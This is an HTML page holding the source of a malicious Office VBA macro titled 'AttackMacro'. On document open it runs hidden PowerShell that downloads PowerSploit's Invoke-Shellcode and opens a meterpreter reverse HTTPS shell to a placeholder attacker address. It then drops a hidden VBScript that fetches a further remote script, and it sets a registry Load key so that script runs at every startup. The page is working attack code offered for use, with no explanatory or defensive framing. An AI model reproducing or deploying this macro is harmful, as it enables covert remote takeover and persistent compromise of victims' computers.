<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>AttackMacro</title>
</head><body>#This uses a specified email address and subject in Outlook to trigger a meterpreter shell. The macro creates a VBScript file in a hidden directory that silently download and executes #a powershell script that parses the default inbox for the specified email address and subject. The script runs in the background all the time and is re-executed on startup.<br/>
<br/>
Sub Auto_Open()<br/>
Execute<br/>
Persist<br/>
Reg<br/>
Start<br/>
<br/>
End Sub<br/>
<br/>
&nbsp;Public Function Execute() As Variant<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Const HIDDEN_WINDOW = 0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strComputer = "."<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Set objStartup = objWMIService.Get("Win32_ProcessStartup")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Set objConfig = objStartup.SpawnInstance_<br/>
&nbsp; &nbsp; &nbsp; &nbsp; objConfig.ShowWindow = HIDDEN_WINDOW<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Set objProcess = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2:Win32_Process")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.x.xxx -Lport 1111 -Force", Null, objConfig, intProcessID<br/>
&nbsp; &nbsp; &nbsp;End Function<br/>
&nbsp; &nbsp; &nbsp;<br/>
Public Function Persist() As Variant<br/>
&nbsp;Set fs = CreateObject("Scripting.FileSystemObject")<br/>
&nbsp; &nbsp; Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)<br/>
&nbsp; &nbsp; a.WriteLine ("Dim objShell")<br/>
&nbsp; &nbsp; a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")<br/>
&nbsp; &nbsp; a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://xxx.xxx.x.xxx/Persist.ps1'))""")<br/>
&nbsp; &nbsp; a.WriteLine ("objShell.Run command,0")<br/>
&nbsp; &nbsp; a.WriteLine ("Set objShell = Nothing")<br/>
&nbsp; &nbsp; a.Close<br/>
&nbsp; &nbsp; GivenLocation = "C:\Users\Public\"<br/>
&nbsp; &nbsp; OldFileName = "config.txt"<br/>
&nbsp; &nbsp; NewFileName = "config.vbs"<br/>
&nbsp; &nbsp; Name GivenLocation &amp; OldFileName As GivenLocation &amp; NewFileName<br/>
&nbsp; &nbsp; SetAttr "C:\Users\Public\config.vbs", vbHidden<br/>
End Function<br/>
<br/>
Public Function Reg() As Variant<br/>
Set WshShell = CreateObject("WScript.Shell")<br/>
WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"<br/>
Set WshShell = Nothing<br/>
<br/>
End Function<br/>
<br/>
Public Function Start() As Variant<br/>
&nbsp;Const HIDDEN_WINDOW = 0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; strComputer = "."<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Shell "wscript C:\Users\Public\config.vbs", vbNormalFocus<br/>
&nbsp; &nbsp; &nbsp; <br/>
End Function<br/>
</body></html>